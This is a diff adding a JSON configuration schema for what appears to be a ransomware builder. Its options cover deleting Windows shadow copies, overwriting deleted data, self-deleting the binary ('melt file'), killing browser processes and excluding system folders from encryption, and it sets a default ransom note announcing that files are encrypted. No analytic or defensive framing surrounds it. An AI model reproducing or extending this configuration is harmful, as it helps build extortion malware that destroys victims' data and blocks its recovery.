@@ -1,0 +1,97 @@
+{
+    "toggles": [
+        {
+            "name": "block input",
+            "value": false
+        },
+        {
+            "name": "force admin",
+            "value": false
+        },
+        {
+            "name": "melt file",
+            "value": true
+        },
+        {
+            "name": "open note",
+            "value": true
+        },
+        {
+            "name": "restart device",
+            "value": false
+        },
+        {
+            "name": "delete shadow copies",
+            "value": false
+        },
+        {
+            "name": "overwrite deleted data",
+            "value": false
+        },
+        {
+            "name": "encrypt separately",
+            "value": false
+        },
+        {
+            "name": "obfuscate file names",
+            "value": false
+        },
+        {
+            "name": "add file extension",
+            "value": true
+        }
+    ],
+    "main": [
+        {
+            "name": "tracking id",
+            "button": "gen random"
+        },
+        {
+            "name": "note",
+            "button": "use default",
+            "textarea": true,
+            "height": "150px",
+            "value": "your files have been encrypted\n\nyour tracking id: %TRACKING_ID%\n\nyour key:\n%ENCRYPTED_KEY%"
+        },
+        {
+            "name": "files enumeration chunk size",
+            "button": "use default",
+            "numbers": true,
+            "value": 300
+        },
+        {
+            "name": "overwrite deleted data passes",
+            "button": "use default",
+            "numbers": true,
+            "value": 3
+        },
+        {
+            "name": "processes to kill",
+            "button": "use default",
+            "textarea": true,
+            "height": "100px",
+            "value": "chrome.exe\nbrave.exe\nfirefox.exe"
+        },
+        {
+            "name": "whitelisted directories",
+            "button": "use default",
+            "textarea": true,
+            "height": "100px",
+            "value": "$Recycle.Bin\n%SYSTEMROOT%\n%PROGRAMFILES%\n%PROGRAMFILES(X86)%"
+        },
+        {
+            "name": "whitelisted file names",
+            "button": "use default",
+            "textarea": true,
+            "height": "100px",
+            "value": "desktop.ini"
+        },
+        {
+            "name": "whitelisted file extensions",
+            "button": "use default",
+            "textarea": true,
+            "height": "100px",
+            "value": "sys\nexe\ndll"
+        }
+    ]
+}
